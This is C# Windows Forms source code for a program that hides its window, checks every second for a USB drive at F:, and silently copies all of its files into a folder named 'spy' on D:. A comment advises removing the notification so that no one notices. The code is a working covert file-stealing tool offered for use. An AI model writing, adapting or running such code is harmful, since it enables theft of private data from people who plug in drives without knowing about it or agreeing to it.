using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.IO;
using System.Diagnostics;

namespace usb_listener
{
    public partial class AUC : Form
    {
        public AUC()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {  // Hihing main windows
            this.Hide();
            // starting the timer for checking usb port every one second
            timer1.Interval = 1000;
            timer1.Start();

            LinkLabel.Link link = new LinkLabel.Link();
            link.LinkData = "http://www.elminalirzayev.com/";
            linkLabel1.Links.Add(link);
        }

        bool isPluged()
        { //getting all drives
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            bool found = false;
            // getting all drives that is ready
            foreach (DriveInfo d in allDrives.Where(x => x.IsReady == true))
            {
                // is drive name is f . regularly it ll be flash drive 

                if (d.Name == "F:\\")
                {
                  
                    found = true;
                    break;

                }
                else
                {
                    

                    found = false;

                }


            }
            return found;
        }
        // method that copied all files from source directory to destination
        void Copy(string src, string dest)
        {

            foreach (string file in Directory.GetFiles(src))
            {
                try
                {
                    File.Copy(file, Path.Combine(dest, Path.GetFileName(file)));
                }
                // catch any other exception that you want.
                catch (PathTooLongException)
                {
                }

            }

            // go recursive on directories
            foreach (string dir in Directory.GetDirectories(src))
            {


                // First create directory...
                // Instead of new DirectoryInfo(dir).Name, you can use any other way to get the dir name,
                // but not Path.GetDirectoryName, since it returns full dir name.
                string destSubDir = Path.Combine(dest, new DirectoryInfo(dir).Name);
                Directory.CreateDirectory(destSubDir);
                // and then go recursive
                Copy(dir, destSubDir);



            }


        }

        // getting correct directory name that not used 
        string getDirectoryName()
        {
            string d = "D:\\spy";
            string d2 = "D:\\spy";


            int count = 1;
            while (Directory.Exists(d))
            {
                d = d2 + count.ToString();
                count++;
            }
            Directory.CreateDirectory(d);
            return d;
        }

        // checking usb drive every second
        private void timer1_Tick(object sender, EventArgs e)
        {
            // if we find usb drive
            if (isPluged())
            {
               

                // copiying
                Copy("F:\\", getDirectoryName());

                //notify that files has alrady copied to destination. you can delete these codes wenn u dont want that someone see this
                notifyIcon1.Visible = true;

                notifyIcon1.ShowBalloonTip(1000);
                // disabling checking for 30 seconds
                timer1.Stop();
                //starting second timer 
                timer2.Interval = 1000;
                timer2.Start();


            }

        }

        //after 30 secons it ll be starting checking automaticly

        private int t2 = 0;
        private void timer2_Tick(object sender, EventArgs e)
        {
            t2++;
            if (t2 == 30)
            {
                t2 = 0;
                timer1.Start();
                timer2.Stop();
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            // visit my website
            Process.Start(e.Link.LinkData as string);
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            timer1.Start();
            timer2.Stop();
            t2 = 0;
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            timer1.Stop();
            timer2.Start();
            t2 = 0;
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
Application.Exit();
        }
    }

}



